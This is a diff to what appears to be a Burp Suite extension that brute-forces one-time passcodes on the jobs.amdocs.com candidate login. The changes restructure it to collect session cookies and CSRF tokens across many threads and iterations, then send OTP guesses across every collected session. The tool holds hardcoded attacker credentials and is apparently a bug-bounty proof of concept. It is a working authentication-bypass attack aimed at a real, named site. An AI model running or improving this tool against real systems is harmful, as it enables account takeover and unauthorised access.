@@ -38,7 +38,7 @@ class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory, IMenuItemH
         self.otp_start = 0
         self.otp_end = 999999
         self.email = "az3m+admin@bugcrowdninja.com"
-        self.password = "Attackeroass@poc2"
+        self.password = "Attackeroass@poc02"
         self.domain = "amdocs.com"
         self.is_running = False
         self.sessions = []  # Store multiple sessions
@@ -52,6 +52,8 @@ class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory, IMenuItemH
         self.repeat_count = 1  # Number of times to repeat the sequence
         self.otp_counter_lock = threading.Lock()  # Lock for thread-safe OTP counter
         self.global_otp_counter = self.otp_start  # Global OTP counter shared across threads
+        self.flows_lock = threading.Lock()  # Lock for thread-safe flow storage
+        self.all_flows = []  # Store all flows from all threads and iterations
         
         # Full referer URL
         self.referer = "https://jobs.amdocs.com/candidate/login?domain=amdocs.com&trackApplicationStatus=false&hl=en&next=http%3A%2F%2Fjobs.amdocs.com%2Fcareerhub%2Fme%3Faction%3Dedit%26trackApplicationStatus%3Dfalse%26hl%3Den%26profile_type%3Dcandidate%26domain%3Damdocs.com%26customredirect%3D1"
@@ -174,8 +176,9 @@ class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory, IMenuItemH
                 
                 self.is_running = True
                 self.is_paused = False
-                # Reset global OTP counter
+                # Reset global OTP counter and flows storage
                 self.global_otp_counter = self.otp_start
+                self.all_flows = []
                 self.startButton.setText("Stop")
                 self.pauseButton.setEnabled(True)
                 self.statusLabel.setText("Status: Running (Repeat: " + str(self.repeat_count) + "x, Threads: " + str(self.num_threads) + ")")
@@ -832,14 +835,12 @@ class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory, IMenuItemH
         ]
         return self.make_request(headers, body)
 
-    def execute_single_iteration(self, repeat_num, total_repeats):
-        """Execute a single iteration: First Steps 1-4 for all flows, then Step 5 for all flows"""
+    def execute_phase1_for_iteration(self, repeat_num, total_repeats):
+        """Execute Phase 1 (Steps 1-4) only for a single iteration - store flows"""
         try:
-            self.log("=== Iteration " + str(repeat_num) + "/" + str(total_repeats) + ": Starting " + str(self.num_sessions) + " flows ===", force=True)
+            self.log("=== Iteration " + str(repeat_num) + "/" + str(total_repeats) + ": Phase 1 - Executing Steps 1-4 for " + str(self.num_sessions) + " flows ===", force=True)
             
-            # Phase 1: Execute Steps 1-4 for all flows and store cookies/CSRF
-            self.log("=== Phase 1: Executing Steps 1-4 for all flows ===", force=True)
-            flow_data_list = []
+            # Execute Steps 1-4 for all flows in this iteration
             for flow_num in range(1, self.num_sessions + 1):
                 if not self.is_running:
                     break
@@ -847,25 +848,35 @@ class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory, IMenuItemH
                 
                 flow_data = self.execute_flow_steps_1_to_4(flow_num)
                 if flow_data:
-                    flow_data_list.append(flow_data)
-                    self.log("Flow " + str(flow_num) + " - Steps 1-4 completed, cookies/CSRF stored", force=True)
+                    # Add iteration number for tracking
+                    flow_data["iteration"] = repeat_num
+                    # Store flow data thread-safely
+                    with self.flows_lock:
+                        self.all_flows.append(flow_data)
+                    self.log("Iteration " + str(repeat_num) + " - Flow " + str(flow_num) + " - Steps 1-4 completed, stored", force=True)
                 else:
-                    self.log("Flow " + str(flow_num) + " - Failed to complete Steps 1-4", force=True)
+                    self.log("Iteration " + str(repeat_num) + " - Flow " + str(flow_num) + " - Failed Steps 1-4", force=True)
                 
                 self.wait_if_paused()
                 time.sleep(self.delay_between_sessions)
             
-            if not self.is_running:
-                return
+            self.log("=== Iteration " + str(repeat_num) + " - Phase 1 completed ===", force=True)
+        except Exception as e:
+            self.log("Error in Phase 1 - Iteration " + str(repeat_num) + ": " + str(e), force=True)
+
+    def execute_phase2_all_flows(self):
+        """Execute Phase 2 (OTP confirmations) for all stored flows"""
+        try:
+            self.log("=== Phase 2: Sending OTP confirmations for ALL flows ===", force=True)
+            self.log("Total flows to process: " + str(len(self.all_flows)), force=True)
             
-            # Phase 2: Send OTP confirmations (Step 5) for each flow using stored cookies/CSRF
-            self.log("=== Phase 2: Sending OTP confirmations for all flows ===", force=True)
-            for flow_data in flow_data_list:
+            # Process all flows collected from all threads and iterations
+            for flow_data in self.all_flows:
                 if not self.is_running:
                     break
                 self.wait_if_paused()
                 
-                # Get next OTPs thread-safely (ensures no duplicates across threads)
+                # Get next OTPs thread-safely (ensures no duplicates)
                 otp_codes = self.get_next_otps(self.otps_per_session)
                 
                 # Send OTP confirmations using this flow's cookies/CSRF
@@ -874,24 +885,27 @@ class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory, IMenuItemH
                 self.wait_if_paused()
                 time.sleep(self.delay_between_sessions)
             
-            self.log("=== Iteration " + str(repeat_num) + ": Completed ===", force=True)
+            self.log("=== Phase 2: All OTP confirmations sent ===", force=True)
         except Exception as e:
-            self.log("Error in iteration " + str(repeat_num) + ": " + str(e), force=True)
+            self.log("Error in Phase 2: " + str(e), force=True)
 
     def execute_full_sequence(self):
-        """Execute the full request sequence with multiple threads"""
+        """Execute the full request sequence: Phase 1 for all iterations, then Phase 2 once"""
         try:
+            self.log("=== Starting execution: " + str(self.repeat_count) + " iteration(s) with " + str(self.num_threads) + " thread(s) ===", force=True)
+            
+            # PHASE 1: Execute Steps 1-4 for ALL iterations (with threads if > 1)
             if self.num_threads == 1:
-                # Single thread - run sequentially
+                # Single thread - run Phase 1 sequentially
                 for repeat_num in range(1, self.repeat_count + 1):
                     if not self.is_running:
                         break
-                    self.statusLabel.setText("Status: Running (Iteration " + str(repeat_num) + "/" + str(self.repeat_count) + ")")
-                    self.execute_single_iteration(repeat_num, self.repeat_count)
+                    self.statusLabel.setText("Status: Phase 1 (Iteration " + str(repeat_num) + "/" + str(self.repeat_count) + ")")
+                    self.execute_phase1_for_iteration(repeat_num, self.repeat_count)
                     if repeat_num < self.repeat_count:
-                        time.sleep(1)
+                        time.sleep(0.5)
             else:
-                # Multiple threads - distribute iterations across threads
+                # Multiple threads - distribute iterations across threads for Phase 1
                 threads = []
                 iterations_per_thread = max(1, self.repeat_count // self.num_threads)
                 remaining = self.repeat_count % self.num_threads
@@ -909,28 +923,40 @@ class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory, IMenuItemH
                     if thread_iterations == 0:
                         break
                     
-                    # Create thread for this batch of iterations
-                    def thread_worker(start_iter, count):
-                        for i in range(count):
-                            if not self.is_running:
-                                break
-                            iter_num = start_iter + i
-                            self.statusLabel.setText("Status: Running (Thread " + str(thread_id + 1) + ", Iteration " + str(iter_num) + "/" + str(self.repeat_count) + ")")
-                            self.execute_single_iteration(iter_num, self.repeat_count)
-                            if i < count - 1:
-                                time.sleep(0.5)
+                    # Create thread for Phase 1 only
+                    def thread_worker_phase1(start_iter, count, tid):
+                        try:
+                            for i in range(count):
+                                if not self.is_running:
+                                    break
+                                iter_num = start_iter + i
+                                self.statusLabel.setText("Status: Phase 1 (Thread " + str(tid + 1) + ", Iteration " + str(iter_num) + "/" + str(self.repeat_count) + ")")
+                                self.execute_phase1_for_iteration(iter_num, self.repeat_count)
+                                if i < count - 1:
+                                    time.sleep(0.5)
+                        except Exception as e:
+                            self.log("Error in thread " + str(tid) + " Phase 1: " + str(e), force=True)
                     
-                    thread = threading.Thread(target=thread_worker, args=(iteration, thread_iterations))
+                    thread = threading.Thread(target=thread_worker_phase1, args=(iteration, thread_iterations, thread_id))
                     thread.daemon = True
                     thread.start()
                     threads.append(thread)
                     iteration += thread_iterations
                 
-                # Wait for all threads to complete
+                # Wait for ALL threads to complete Phase 1
+                self.log("Waiting for all threads to complete Phase 1...", force=True)
                 for thread in threads:
                     thread.join()
             
-            self.log("=== All iterations completed ===", force=True)
+            if not self.is_running:
+                return
+            
+            # PHASE 2: Execute OTP confirmations ONCE for all collected flows
+            self.log("=== All Phase 1 completed. Total flows collected: " + str(len(self.all_flows)) + " ===", force=True)
+            self.statusLabel.setText("Status: Phase 2 - Sending OTP confirmations")
+            self.execute_phase2_all_flows()
+            
+            self.log("=== All phases completed ===", force=True)
         except Exception as e:
             self.log("Error in execute_full_sequence: " + str(e), force=True)
             import traceback
